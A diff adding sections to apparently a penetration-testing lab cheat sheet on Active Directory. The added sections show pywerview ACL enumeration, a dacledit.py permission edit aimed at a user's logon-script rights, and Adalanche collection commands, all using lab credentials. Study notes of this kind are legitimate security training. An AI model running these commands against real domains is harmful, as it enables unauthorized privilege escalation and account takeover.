@@ -260,3 +260,23 @@ KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 46c30d948cbe2ab0749d2f728966
 
 KRB5CCNAME=gabriel.ccache smbclient.py -k -no-pass LAB-DC.LAB.LOCAL
 ```
+
+## Logon Scripts
+- read property
+- write property
+
+### Abusing
+```bash
+python3 pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids
+
+pywerview get-objectacl --name 'eric' -w inlanefreight.local -t 10.129.229.224 -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'
+
+python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip 10.129.229.224 inlanefreight.local/'david':'SecurePassDav!d5'
+```
+
+### Adalanche
+```bash
+./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory --domain inlanefreight.local --server 10.129.229.224  --username 'david' --password 'SecurePassDav!d5'
+
+./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data
+```
